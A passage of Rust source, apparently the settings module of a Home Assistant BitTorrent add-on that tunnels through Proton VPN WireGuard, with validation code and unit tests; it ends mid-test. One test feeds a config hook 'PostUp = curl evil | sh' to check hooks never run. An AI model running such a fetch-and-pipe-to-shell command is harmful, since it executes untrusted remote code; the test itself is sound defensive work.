        bail!("`{field}` must not contain `..`");
    }
    let ok = PERMITTED_DATA_ROOTS
        .iter()
        .any(|root| p.starts_with(root) && p != Path::new(root));
    if !ok {
        bail!(
            "`{field}` ({}) must be a sub-folder of /media, /share or /config so downloads \
             land on storage Home Assistant maps into this app",
            p.display()
        );
    }
    Ok(p.to_path_buf())
}

fn parse_local_cidrs(raw: &[String], notes: &mut Vec<String>) -> Result<Vec<Ipv4Cidr>> {
    let permitted: Vec<Ipv4Cidr> = PERMITTED_LOCAL_RANGES
        .iter()
        .filter_map(|(a, p)| Ipv4Cidr::new(*a, *p))
        .collect();
    let mut cidrs = Vec::with_capacity(raw.len() + 1);
    for entry in raw.iter().map(|s| s.trim()).filter(|s| !s.is_empty()) {
        let c: Ipv4Cidr = entry
            .parse()
            .with_context(|| format!("invalid `local_allow_cidrs` entry `{entry}`"))?;
        if !permitted.iter().any(|r| r.contains(&c)) {
            bail!(
                "`local_allow_cidrs` entry `{entry}` is not a private LAN range \
                 (allowed: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 100.64.0.0/10, \
                 169.254.0.0/16); public ranges would bypass the VPN"
            );
        }
        if c.network() != c {
            notes.push(format!(
                "`local_allow_cidrs` entry {c} normalised to {}",
                c.network()
            ));
        }
        cidrs.push(c.network());
    }
    if !cidrs.iter().any(|c| c.contains(&HASSIO_NETWORK)) {
        notes.push(format!(
            "always allowing Home Assistant's internal network {HASSIO_NETWORK} \
             (Ingress, Supervisor watchdog and other apps need it)"
        ));
        cidrs.push(HASSIO_NETWORK);
    }
    Ok(cidr::collapse(&cidrs))
}

/// Web UI login used for port 8080 (LAN clients, Sonarr/Radarr) and injected
/// by the Ingress proxy. The password reaches rtbit only via stdin.
/// The one rule for Web UI user names, shared by the options and the
/// qBittorrent import: 1-64 bytes, no blanks, `:` or control characters, and
/// no leading `-` (it is passed to `rtbit auth reset-password` and must never
/// read as an option such as `--help`).
pub fn check_webui_username(username: &str) -> std::result::Result<(), &'static str> {
    if username.is_empty() || username.len() > 64 {
        return Err("must be 1-64 characters");
    }
    if username
        .chars()
        .any(|c| c.is_control() || c == ':' || c.is_whitespace())
    {
        return Err("must not contain spaces, `:` or control characters");
    }
    if username.starts_with('-') {
        return Err("must not start with `-`");
    }
    Ok(())
}

fn validate_webui_credentials(opts: &Options) -> Result<(String, Option<Secret>)> {
    let username = opts.webui_username.trim();
    check_webui_username(username).map_err(|why| anyhow!("`webui_username` {why}"))?;
    let password = match opts.webui_password.as_deref().filter(|p| !p.is_empty()) {
        None => None,
        Some(p) => {
            if p.chars().count() < 8 || p.len() > 256 {
                bail!("`webui_password` must be 8-256 characters (leave it empty to generate one)");
            }
            if p.chars().any(char::is_control) {
                bail!("`webui_password` must not contain line breaks or control characters");
            }
            Some(Secret::new(p.to_owned()))
        }
    };
    Ok((username.to_owned(), password))
}

/// Resolves the three WireGuard setup methods (wg0.conf, paste, `wg_*`).
fn resolve_vpn(
    opts: &Options,
    paths: &Paths,
    reason: String,
    notes: &mut Vec<String>,
) -> Result<VpnSettings> {
    // Source 1: /config/wg0.conf, source 2: the pasted option.
    let file_path = paths.config_root.join(WG_CONF_FILE);
    let file_text = match std::fs::read_to_string(&file_path) {
        Ok(t) if t.trim().is_empty() => {
            notes.push(format!("ignoring empty /config/{WG_CONF_FILE}"));
            None
        }
        Ok(t) => Some(t),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => None,
        Err(e) => bail!("cannot read /config/{WG_CONF_FILE}: {e}"),
    };
    let pasted = non_blank(&opts.wireguard_conf);
    let (conf, source) = match (file_text.as_deref(), pasted) {
        (Some(text), pasted) => {
            if pasted.is_some() {
                notes.push(format!(
                    "using /config/{WG_CONF_FILE}; the pasted `wireguard_conf` option is ignored"
                ));
            }
            let c = parse_wg_conf(text)
                .with_context(|| format!("cannot parse /config/{WG_CONF_FILE}"))?;
            (c, format!("/config/{WG_CONF_FILE}"))
        }
        (None, Some(text)) => (
            parse_wg_conf(text).context("cannot parse the `wireguard_conf` option")?,
            "the `wireguard_conf` option".to_owned(),
        ),
        (None, None) => (WgConf::default(), "the `wg_*` options".to_owned()),
    };
    notes.extend(conf.warnings.iter().cloned());
    let have_conf = file_text.is_some() || pasted.is_some();

    // Source 3: structured fields only fill in what the .conf leaves out.
    let mut pick = |field: &str, structured: &Option<String>, from_conf: &Option<String>| {
        let from_conf = from_conf
            .as_deref()
            .map(str::trim)
            .filter(|s| !s.is_empty());
        match (from_conf, non_blank(structured)) {
            (Some(c), Some(st)) => {
                if c != st {
                    notes.push(format!(
                        "`{field}` is ignored because {source} already sets it"
                    ));
                }
                Some(c.to_owned())
            }
            (Some(c), None) => Some(c.to_owned()),
            (None, st) => st.map(str::to_owned),
        }
    };

    let missing = |what: &str, field: &str, conf_key: &str| {
        let hint = if have_conf {
            format!("{source} has no `{conf_key} = ...` line; add it or fill `{field}`")
        } else {
            format!(
                "Put your Proton VPN WireGuard .conf in /config/{WG_CONF_FILE}, paste it \
                     into `wireguard_conf` (it contains `{conf_key} = ...`) or fill `{field}`"
            )
        };
        anyhow!("no WireGuard {what} configured. {hint}")
    };

    let private_key = pick("wg_private_key", &opts.wg_private_key, &conf.private_key)
        .ok_or_else(|| missing("private key", "wg_private_key", "PrivateKey"))?;
    let private_key = WgKey::parse("wg_private_key / PrivateKey", &private_key)?;

    let peer_public_key = pick("wg_public_key", &opts.wg_public_key, &conf.peer_public_key)
        .ok_or_else(|| missing("server public key", "wg_public_key", "PublicKey"))?;
    let peer_public_key = WgKey::parse("wg_public_key / PublicKey", &peer_public_key)?;
    if peer_public_key == private_key {
        bail!(
            "`wg_public_key` equals the private key; the public key must be the \
                 *server's* key from the [Peer] section"
        );
    }

    let preshared_key = pick(
        "wg_preshared_key",
        &opts.wg_preshared_key,
        &conf.preshared_key,
    )
    .map(|k| WgKey::parse("wg_preshared_key / PresharedKey", &k))
    .transpose()?;

    let endpoint = pick("wg_endpoint", &opts.wg_endpoint, &conf.endpoint)
        .ok_or_else(|| missing("endpoint", "wg_endpoint", "Endpoint"))?;
    let endpoint = parse_endpoint(&endpoint)?;

    let address_entries: Vec<String> =
        match (conf.addresses.is_empty(), non_blank(&opts.wg_address)) {
            (false, structured) => {
                if structured.is_some() {
                    notes.push(format!(
                        "`wg_address` is ignored because {source} already sets it"
                    ));
                }
                conf.addresses.clone()
            }
            (true, Some(a)) => split_list(a).collect(),
            (true, None) => Vec::new(),
        };
    if address_entries.is_empty() {
        return Err(missing("tunnel address", "wg_address", "Address"));
    }
    let mut v4_addresses = Vec::new();
    for entry in &address_entries {
        match entry.parse::<Ipv4Cidr>() {
            Ok(c) => v4_addresses.push(c),
            // Only a real IPv6 network is skipped; `10.2.0.2:51820` and other
            // typos are errors, not silently ignored.
            Err(_) if is_ipv6_network(entry) => notes.push(format!(
                "ignoring IPv6 tunnel address {entry} (IPv6 is dropped by the kill-switch)"
            )),
            Err(e) => return Err(anyhow!(e)).context("invalid WireGuard `Address`"),
        }
    }
    let address = *v4_addresses.first().ok_or_else(|| {
        anyhow!("the WireGuard `Address` has no IPv4 address (Proton uses 10.2.0.2/32)")
    })?;
    if v4_addresses.len() > 1 {
        notes.push(format!("using the first IPv4 tunnel address {address}"));
    }
    if !usable_unicast(address.addr()) {
        bail!("the WireGuard `Address` {address} is not a usable tunnel address");
    }

    let dns_entries: Vec<String> = match (conf.dns.is_empty(), non_blank(&opts.wg_dns)) {
        (false, structured) => {
            if structured.is_some() {
                notes.push(format!(
                    "`wg_dns` is ignored because {source} already sets it"
                ));
            }
            conf.dns.clone()
        }
        (true, Some(d)) => split_list(d).collect(),
        (true, None) => Vec::new(),
    };
    let mut dns = parse_ipv4_list(dns_entries, "DNS server", notes);
    if dns.is_empty() {
        notes.push(format!(
            "no IPv4 DNS configured; using Proton's {PROTON_GATEWAY}"
        ));
        dns.push(PROTON_GATEWAY);
    }

    if !conf.allowed_ips.is_empty() {
        let v4: Vec<&String> = conf
            .allowed_ips
            .iter()
            .filter(|a| !a.contains(':'))
            .collect();
        if conf.allowed_ips.len() != v4.len() {
            notes.push("ignoring IPv6 AllowedIPs (IPv6 is dropped by the kill-switch)".to_owned());
        }
        if !v4.iter().any(|a| a.trim() == "0.0.0.0/0") {
            notes.push(
                "AllowedIPs is not 0.0.0.0/0; split tunnelling is not supported, all IPv4 \
                     traffic goes through the tunnel"
                    .to_owned(),
            );
        }
    }

    let persistent_keepalive = match conf.persistent_keepalive {
        Some(0) => {
            notes.push(format!(
                "PersistentKeepalive is off in the config; using {DEFAULT_KEEPALIVE}s so \
                     NAT-PMP port forwarding keeps working"
            ));
            DEFAULT_KEEPALIVE
        }
        Some(k) => k,
        None => DEFAULT_KEEPALIVE,
    };

    let mtu = conf.mtu.unwrap_or(DEFAULT_MTU);
    if !(1280..=1500).contains(&mtu) {
        bail!("WireGuard MTU {mtu} is out of range (1280-1500; leave it unset for 1420)");
    }

    let nat_pmp = if opts.enable_nat_pmp {
        let gateway: Ipv4Addr = opts.nat_pmp_gateway.trim().parse().map_err(|_| {
            anyhow!(
                "`nat_pmp_gateway` `{}` is not an IPv4 address (Proton: 10.2.0.1)",
                opts.nat_pmp_gateway
            )
        })?;
        if !usable_unicast(gateway) {
            bail!("`nat_pmp_gateway` {gateway} is not a usable gateway address (Proton: 10.2.0.1)");
        }
        if conf.proton_nat_pmp == Some(false) {
            notes.push(
                "your Proton WireGuard config says `NAT-PMP (Port Forwarding) = off`: \
                     regenerate it on account.protonvpn.com with NAT-PMP enabled, otherwise \
                     no port will be forwarded"
                    .to_owned(),
            );
        }
        Some(NatPmpSettings { gateway })
    } else {
        None
    };

    Ok(VpnSettings {
        wireguard: WireGuardConfig {
            private_key,
            peer_public_key,
            preshared_key,
            endpoint,
            address,
            dns,
            persistent_keepalive,
            mtu,
        },
        nat_pmp,
        source,
        reason,
    })
}

/// Whether `text` is a WireGuard config the tunnel could start from on its
/// own: the same checks as at start-up (keys, endpoint, IPv4 address, MTU),
/// without NAT-PMP and without reading `/config`.
pub fn check_wg_conf_text(text: &str) -> Result<()> {
    let opts = Options {
        vpn_enabled: true,
        wireguard_conf: Some(text.to_owned()),
        enable_nat_pmp: false,
        ..Options::default()
    };
    // A root that cannot exist, so no `/config/wg0.conf` is picked up.
    let paths = Paths {
        config_root: PathBuf::from("/nonexistent/rbittorrent-wg-check"),
    };
    resolve_vpn(&opts, &paths, String::new(), &mut Vec::new()).map(|_| ())
}

impl Settings {
    pub fn from_options(opts: &Options, paths: &Paths) -> Result<Self> {
        let mut notes = Vec::new();
        let wg_file_present = path_present(&paths.config_root.join(WG_CONF_FILE));
        let vpn = match vpn_intent(opts, wg_file_present) {
            Some(reason) => {
                let why = reason.clone();
                Some(
                    resolve_vpn(opts, paths, reason, &mut notes)
                        .with_context(|| format!("VPN mode is on ({why})"))?,
                )
            }
            None => None,
        };

        if opts.listen_port == 0 {
            bail!("`listen_port` must be between 1 and 65535");
        }

        let download_dir = validate_data_dir("download_dir", &opts.download_dir)?;
        let completed_dir = validate_data_dir("completed_dir", &opts.completed_dir)?;
        if download_dir == completed_dir {
            bail!("`download_dir` and `completed_dir` must be different folders");
        }
        let mount_root = |p: &Path| p.components().nth(1).map(|c| c.as_os_str().to_owned());
        if mount_root(&download_dir) != mount_root(&completed_dir) {
            notes.push(
                "download_dir and completed_dir are on different mounts; moving finished \
                 torrents will copy the data instead of renaming it"
                    .to_owned(),
            );
        }

        let (webui_username, webui_password) = validate_webui_credentials(opts)?;

        let local_allow_cidrs = parse_local_cidrs(&opts.local_allow_cidrs, &mut notes)?;
        if let Some(v) = &vpn {
            let addr = v.wireguard.address.addr();
            for c in local_allow_cidrs.iter().filter(|c| c.contains_addr(addr)) {
                tracing::debug!(
                    "local range {c} contains the tunnel address {addr}; tunnel traffic still \
                     wins via host routes"
                );
            }
        }

        Ok(Settings {
            vpn,
            fallback_listen_port: opts.listen_port,
            download_dir,
            completed_dir,
            data_home: paths.config_root.join("db"),
            cache_home: paths.config_root.join("cache"),
            local_allow_cidrs,
            log_level: opts.log_level,
            webui_port: WEBUI_PORT,
            ingress_port: INGRESS_PORT,
            webui_username,
            webui_password,
            enable_dht: opts.enable_dht,
            allow_unsandboxed: opts.allow_unsandboxed,
            config_root: paths.config_root.clone(),
            notes,
        })
    }

    /// Ports opened on wg0 when the kill-switch is first loaded: the static
    /// `listen_port` for VPN without NAT-PMP (providers with a fixed forwarded
    /// port), none otherwise (NAT-PMP opens its leased port; direct mode has
    /// no firewall).
    pub fn static_bt_ports(&self) -> Vec<u16> {
        match &self.vpn {
            Some(v) if v.nat_pmp.is_none() => vec![self.fallback_listen_port],
            _ => Vec::new(),
        }
    }

    /// The Web UI password: the configured one, or a random one generated
    /// once and kept in `/config/.webui-password` (mode 0600). The bool is
    /// true when it was just generated.
    pub fn resolve_webui_password(&self) -> Result<(Secret, bool)> {
        if let Some(p) = &self.webui_password {
            return Ok((p.clone(), false));
        }
        let file = self.config_root.join(GENERATED_PASSWORD_FILE);
        match std::fs::read_to_string(&file) {
            Ok(text) => {
                let p = text.trim();
                if (16..=256).contains(&p.len()) && !p.chars().any(char::is_control) {
                    return Ok((Secret::new(p.to_owned()), false));
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => bail!("cannot read /config/{GENERATED_PASSWORD_FILE}: {e}"),
        }
        let password = generate_password()?;
        write_private(&file, &format!("{password}\n"))
            .with_context(|| format!("cannot write /config/{GENERATED_PASSWORD_FILE}"))?;
        Ok((Secret::new(password), true))
    }
}

/// 24 random base62 characters (~142 bits) from the kernel CSPRNG.
fn generate_password() -> Result<String> {
    use std::io::Read;
    const ALPHABET: &[u8; 62] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut random = [0u8; 128];
    std::fs::File::open("/dev/urandom")
        .and_then(|mut f| f.read_exact(&mut random))
        .context("cannot read /dev/urandom")?;
    // Rejection sampling keeps the distribution uniform (248 = 4 * 62).
    let password: String = random
        .iter()
        .filter(|&&b| b < 248)
        .filter_map(|&b| ALPHABET.get(usize::from(b % 62)).map(|&c| char::from(c)))
        .take(24)
        .collect();
    if password.len() < 24 {
        bail!("not enough randomness for a password");
    }
    Ok(password)
}

/// Writes a file readable by root only (0600), atomically: a fresh,
/// unpredictably named temp file in the same folder (`O_CREAT | O_EXCL`, so
/// an existing file or symlink is never reused or followed), fsync, rename.
/// The temp file is removed if anything fails.
pub fn write_private(path: &Path, contents: &str) -> std::io::Result<()> {
    use std::io::Write;
    use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "file".to_owned());
    let mut last_err = None;
    for _ in 0..8 {
        let mut nonce = [0u8; 8];
        if ring::rand::SecureRandom::fill(&ring::rand::SystemRandom::new(), &mut nonce).is_err() {
            return Err(std::io::Error::other("no randomness for a temp file name"));
        }
        let suffix: String = nonce.iter().map(|b| format!("{b:02x}")).collect();
        let tmp = path.with_file_name(format!(".{name}.{suffix}.tmp"));
        let mut f = match std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o600)
            .custom_flags(libc::O_NOFOLLOW)
            .open(&tmp)
        {
            Ok(f) => f,
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
                last_err = Some(e);
                continue;
            }
            Err(e) => return Err(e),
        };
        let written = f
            // The umask could only narrow 0600, but be explicit anyway.
            .set_permissions(std::fs::Permissions::from_mode(0o600))
            .and_then(|()| f.write_all(contents.as_bytes()))
            .and_then(|()| f.sync_all());
        drop(f);
        let result = written.and_then(|()| std::fs::rename(&tmp, path));
        if result.is_err() {
            let _ = std::fs::remove_file(&tmp);
        }
        return result;
    }
    Err(last_err.unwrap_or_else(|| std::io::Error::other("cannot create a temp file")))
}

#[cfg(test)]
mod tests {
    use super::*;

    const PRIV: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
    const PUB: &str = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";
    const PSK: &str = "FpCyhws9cxwWoV4xELtfJvjJN+zQVRPISllRWgeopVE=";

    const PROTON_CONF: &str = "[Interface]\r\n\
# Key for homeassistant\r\n\
# Bouncing = 7\r\n\
# NetShield = 1\r\n\
# Moderate NAT = off\r\n\
# NAT-PMP (Port Forwarding) = on\r\n\
# VPN Accelerator = on\r\n\
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\r\n\
Address = 10.2.0.2/32, 2a07:b944::2:2/128\r\n\
DNS = 10.2.0.1, 2a07:b944::2:1\r\n\
\r\n\
[Peer]\r\n\
# NL-FREE#1\r\n\
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\r\n\
AllowedIPs = 0.0.0.0/0, ::/0\r\n\
Endpoint = 190.2.131.156:51820\r\n";

    fn opts_with_conf(conf: &str) -> Options {
        Options {
            wireguard_conf: Some(conf.to_owned()),
            ..Options::default()
        }
    }

    fn settings(opts: &Options) -> Result<Settings> {
        Settings::from_options(opts, &Paths::default())
    }

    fn vpn(s: &Settings) -> &VpnSettings {
        s.vpn.as_ref().expect("VPN mode")
    }

    #[test]
    fn key_validation() {
        assert!(decode_key(PRIV).is_some());
        assert!(decode_key(PUB).is_some());
        assert!(decode_key("short=").is_none());
        // 44 chars but invalid alphabet.
        assert!(decode_key("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBm!=").is_none());
        // Non-zero trailing bits ('n' instead of 'k' before the padding).
        assert!(decode_key("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmn=").is_none());
        assert!(WgKey::parse("k", " \t yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk= \n").is_ok());
        assert_eq!(
            format!("{:?}", WgKey::parse("k", PRIV).unwrap()),
            "WgKey(<redacted>)"
        );
    }

    #[test]
    fn parses_proton_conf_with_comments_crlf_and_ipv6() {
        let c = parse_wg_conf(PROTON_CONF).unwrap();
        assert_eq!(c.private_key.as_deref(), Some(PRIV));
        assert_eq!(c.peer_public_key.as_deref(), Some(PUB));
        assert_eq!(c.endpoint.as_deref(), Some("190.2.131.156:51820"));
        assert_eq!(c.addresses, vec!["10.2.0.2/32", "2a07:b944::2:2/128"]);
        assert_eq!(c.proton_nat_pmp, Some(true));

        let s = settings(&opts_with_conf(PROTON_CONF)).unwrap();
        let wg = &vpn(&s).wireguard;
        assert_eq!(wg.address.to_string(), "10.2.0.2/32");
        assert_eq!(wg.dns, vec![Ipv4Addr::new(10, 2, 0, 1)]);
        assert_eq!(
            wg.endpoint.host,
            EndpointHost::Ip(Ipv4Addr::new(190, 2, 131, 156))
        );
        assert_eq!(wg.endpoint.port, 51820);
        assert_eq!(wg.persistent_keepalive, DEFAULT_KEEPALIVE);
        assert_eq!(wg.mtu, DEFAULT_MTU);
        assert!(s.notes.iter().any(|n| n.contains("IPv6 tunnel address")));
        assert!(s.notes.iter().any(|n| n.contains("IPv6 DNS server")));
        assert!(s.notes.iter().any(|n| n.contains("IPv6 AllowedIPs")));
        assert_eq!(
            vpn(&s).nat_pmp,
            Some(NatPmpSettings {
                gateway: PROTON_GATEWAY
            })
        );
    }

    #[test]
    fn parses_weird_whitespace_case_and_inline_comments() {
        let conf = "\u{feff}\n\n   [ interface ]   \n\tprivatekey=yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=   # mine\n\
            address =10.2.0.2/32\nMTU = 1380\n[PEER]\n  PUBLICKEY   =    xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\n\
            endpoint = nl-free-01.protonvpn.net\npersistentkeepalive = 15\npresharedkey = FpCyhws9cxwWoV4xELtfJvjJN+zQVRPISllRWgeopVE=\n";
        let s = settings(&opts_with_conf(conf)).unwrap();
        let wg = &vpn(&s).wireguard;
        assert_eq!(wg.mtu, 1380);
        assert_eq!(wg.persistent_keepalive, 15);
        assert_eq!(
            wg.endpoint,
            Endpoint {
                host: EndpointHost::Name("nl-free-01.protonvpn.net".into()),
                port: 51820
            }
        );
        assert_eq!(wg.preshared_key.as_ref().map(WgKey::as_base64), Some(PSK));
    }

    #[test]
    fn parses_single_line_paste_with_spaces_or_no_separators() {
        let spaced = PROTON_CONF.replace("\r\n", " ");
        let squashed = PROTON_CONF.replace("\r\n", "");
        for variant in [spaced, squashed] {
            let c = parse_wg_conf(&variant).unwrap();
            assert_eq!(c.private_key.as_deref(), Some(PRIV), "{variant}");
            assert_eq!(c.peer_public_key.as_deref(), Some(PUB), "{variant}");
            assert_eq!(
                c.endpoint.as_deref(),
                Some("190.2.131.156:51820"),
                "{variant}"
            );
            assert_eq!(c.proton_nat_pmp, Some(true));
            let s = settings(&opts_with_conf(&variant)).unwrap();
            assert_eq!(vpn(&s).wireguard.address.to_string(), "10.2.0.2/32");
            assert_eq!(vpn(&s).wireguard.dns, vec![PROTON_GATEWAY]);
        }
    }

    #[test]
    fn single_line_paste_never_splits_key_material() {
        // A valid key whose base64 tail looks like the `MTU =` key name.
        let tricky = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fMTU=";
        assert!(decode_key(tricky).is_some());
        let conf = PROTON_CONF.replace(PRIV, tricky);
        for variant in [conf.replace("\r\n", " "), conf.replace("\r\n", "")] {
            let c = parse_wg_conf(&variant).unwrap();
            assert_eq!(c.private_key.as_deref(), Some(tricky), "{variant}");
            assert_eq!(c.mtu, None, "{variant}");
            let s = settings(&opts_with_conf(&variant)).unwrap();
            assert_eq!(vpn(&s).wireguard.private_key.as_base64(), tricky);
        }
    }

    #[test]
    fn rejects_bad_confs() {
        assert!(parse_wg_conf("PrivateKey = x\n").is_err()); // before [Interface]
        assert!(parse_wg_conf("[Interface]\nnonsense line\n").is_err());
        assert!(parse_wg_conf("[Interface]\n[Peer]\n[Peer]\n").is_err());
        assert!(parse_wg_conf("[Wat]\n").is_err());
        let hooks = parse_wg_conf("[Interface]\nPostUp = curl evil | sh\n").unwrap();
        assert!(hooks.warnings.iter().any(|w| w.contains("never executed")));
    }

    #[test]
    fn endpoint_parsing() {
        assert_eq!(
            parse_endpoint("1.2.3.4:1234").unwrap(),
            Endpoint {
                host: EndpointHost::Ip(Ipv4Addr::new(1, 2, 3, 4)),
                port: 1234
            }
        );
        assert_eq!(parse_endpoint("1.2.3.4").unwrap().port, 51820);
        assert_eq!(
            parse_endpoint("CH-NL-1.protonvpn.NET:51820").unwrap().host,
            EndpointHost::Name("ch-nl-1.protonvpn.net".into())
        );
        assert!(parse_endpoint("[2001:db8::1]:51820").is_err());
        assert!(parse_endpoint("2001:db8::1").is_err());
        assert!(parse_endpoint("1.2.3.4:0").is_err());
        assert!(parse_endpoint("1.2.3.4:99999").is_err());
        assert!(parse_endpoint("bad_host!:51820").is_err());
        assert!(parse_endpoint("0.0.0.0:51820").is_err());
        assert!(parse_endpoint("").is_err());
    }

    #[test]
    fn conf_wins_and_structured_fields_only_fill_gaps() {
        let mut o = opts_with_conf(PROTON_CONF);
        o.wg_endpoint = Some("ch-de-5.protonvpn.net:51820".into());
        let s = settings(&o).unwrap();
        assert_eq!(
            vpn(&s).wireguard.endpoint.host,
            EndpointHost::Ip(Ipv4Addr::new(190, 2, 131, 156))
        );
        assert!(
            s.notes
                .iter()
                .any(|n| n.contains("`wg_endpoint` is ignored")),
            "{:?}",
            s.notes
        );
        assert_eq!(vpn(&s).source, "the `wireguard_conf` option");

        // A .conf without DNS gets it from `wg_dns`.
        let no_dns = PROTON_CONF.replace("DNS = 10.2.0.1, 2a07:b944::2:1\r\n", "");
        let mut o = opts_with_conf(&no_dns);
        o.wg_dns = Some("10.2.0.1, 1.1.1.1".into());
        let s = settings(&o).unwrap();
        assert_eq!(
            vpn(&s).wireguard.dns,
            vec![PROTON_GATEWAY, Ipv4Addr::new(1, 1, 1, 1)]
        );

        // Structured fields alone are a complete configuration.
        let structured = structured_options();
        let s = settings(&structured).unwrap();
        assert_eq!(vpn(&s).wireguard.dns, vec![PROTON_GATEWAY]);
        assert_eq!(vpn(&s).wireguard.address.to_string(), "10.2.0.2/32");
        assert_eq!(vpn(&s).source, "the `wg_*` options");

        // A bare address becomes /32.
        let mut bare = structured.clone();
        bare.wg_address = Some("10.2.0.2".into());
        assert_eq!(
            vpn(&settings(&bare).unwrap()).wireguard.address.prefix(),
            32
        );
    }

    fn structured_options() -> Options {
        Options {
            wg_private_key: Some(PRIV.into()),
            wg_public_key: Some(PUB.into()),
            wg_endpoint: Some("190.2.131.156:51820".into()),
            wg_address: Some("10.2.0.2/32".into()),
            ..Options::default()
        }
    }

    /// A unique, empty temporary directory (no extra crates needed).
    fn temp_dir(tag: &str) -> PathBuf {
        use std::sync::atomic::{AtomicU32, Ordering};
        static N: AtomicU32 = AtomicU32::new(0);
        let dir = std::env::temp_dir().join(format!(
            "rbittorrent-supervisor-test-{}-{tag}-{}",
            std::process::id(),
            N.fetch_add(1, Ordering::Relaxed)
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn wg0_conf_file_has_top_priority() {
        let root = temp_dir("wg0");
        let paths = Paths {
            config_root: root.clone(),
        };
        let file_conf = PROTON_CONF.replace("190.2.131.156", "185.159.157.10");
        std::fs::write(root.join(WG_CONF_FILE), &file_conf).unwrap();

        // File alone.
        let s = Settings::from_options(&Options::default(), &paths).unwrap();
        assert_eq!(
            vpn(&s).wireguard.endpoint.host,
            EndpointHost::Ip(Ipv4Addr::new(185, 159, 157, 10))
        );
        assert_eq!(vpn(&s).source, "/config/wg0.conf");
        assert_eq!(s.data_home, root.join("db"));

        // File beats the pasted option and the structured fields.
        let mut o = opts_with_conf(PROTON_CONF);
        o.wg_endpoint = Some("1.2.3.4:51820".into());
        let s = Settings::from_options(&o, &paths).unwrap();
        assert_eq!(
            vpn(&s).wireguard.endpoint.host,
            EndpointHost::Ip(Ipv4Addr::new(185, 159, 157, 10))
        );
        assert!(
            s.notes
                .iter()
                .any(|n| n.contains("pasted `wireguard_conf` option is ignored"))
        );

        // An empty file is ignored, the paste is used.
        std::fs::write(root.join(WG_CONF_FILE), "  \n").unwrap();
        let s = Settings::from_options(&opts_with_conf(PROTON_CONF), &paths).unwrap();
        assert_eq!(vpn(&s).source, "the `wireguard_conf` option");

        // A broken file is an error that names the file.
        std::fs::write(root.join(WG_CONF_FILE), "[Interface]\ngarbage\n").unwrap();
        let err = format!(
            "{:#}",
            Settings::from_options(&Options::default(), &paths).unwrap_err()
        );
        assert!(err.contains("/config/wg0.conf"), "{err}");
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn semicolon_flattened_pastes_are_accepted() {
        for sep in ["; ", ";", " ; ", ";\n"] {
            let flat = PROTON_CONF.replace("\r\n", sep);
            let c = parse_wg_conf(&flat).unwrap_or_else(|e| panic!("{sep:?}: {e:#}\n{flat}"));
            assert_eq!(c.private_key.as_deref(), Some(PRIV), "{sep:?}");
            assert_eq!(c.peer_public_key.as_deref(), Some(PUB), "{sep:?}");
            assert_eq!(
                c.endpoint.as_deref(),
                Some("190.2.131.156:51820"),
                "{sep:?}"
            );
            assert_eq!(c.dns, vec!["10.2.0.1", "2a07:b944::2:1"], "{sep:?}");
            assert_eq!(c.proton_nat_pmp, Some(true), "{sep:?}");
            let s = settings(&opts_with_conf(&flat)).unwrap();
            assert_eq!(vpn(&s).wireguard.address.to_string(), "10.2.0.2/32");
        }
    }

    #[test]
    fn semicolons_in_multiline_confs() {
        let conf = format!(
            "[Interface]\nPrivateKey = {PRIV}; Address = 10.2.0.2/32; DNS = 10.2.0.1 # DNS = 9.9.9.9; MTU = 1300\n\
             PostUp = iptables -A a; iptables -A b\n[Peer]\nPublicKey = {PUB};\nEndpoint = 190.2.131.156:51820;\n"
        );
        let c = parse_wg_conf(&conf).unwrap();
        assert_eq!(c.private_key.as_deref(), Some(PRIV));
        assert_eq!(c.addresses, vec!["10.2.0.2/32"]);
        assert_eq!(
            c.dns,
            vec!["10.2.0.1"],
            "commented-out DNS must stay a comment"
        );
        assert_eq!(c.mtu, None, "commented-out MTU must stay a comment");
        assert_eq!(c.peer_public_key.as_deref(), Some(PUB));
        assert_eq!(c.endpoint.as_deref(), Some("190.2.131.156:51820"));
        assert!(c.warnings.iter().any(|w| w.contains("postup")));
    }

    #[test]
    fn hook_commands_never_become_directives() {
        // Multi-line: `mtu=1400` and `; DNS = ...` inside a hook stay in it.
        let conf = format!(
            "[Interface]\nPrivateKey = {PRIV}\nAddress = 10.2.0.2/32\nDNS = 10.2.0.1\n\
             PostUp = ip link set %i mtu=1400; DNS = 6.6.6.6; iptables -A x\n\
             [Peer]\nPublicKey = {PUB}\nEndpoint = 190.2.131.156:51820\n"
        );
        let c = parse_wg_conf(&conf).unwrap();
        assert_eq!(c.mtu, None);
        assert_eq!(c.dns, vec!["10.2.0.1"]);
        // Single line, flattened with spaces or with nothing at all.
        for flat in [conf.replace('\n', " "), conf.replace('\n', "")] {
            let c = parse_wg_conf(&flat).unwrap_or_else(|e| panic!("{e:#}\n{flat}"));
            assert_eq!(c.mtu, None, "{flat}");
            assert!(!c.dns.iter().any(|d| d == "6.6.6.6"), "{flat}");
            assert_eq!(c.private_key.as_deref(), Some(PRIV), "{flat}");
            assert_eq!(c.peer_public_key.as_deref(), Some(PUB), "{flat}");
        }
    }

    #[test]
    fn commented_out_lines_stay_comments_in_single_line_pastes() {
        let conf = format!(
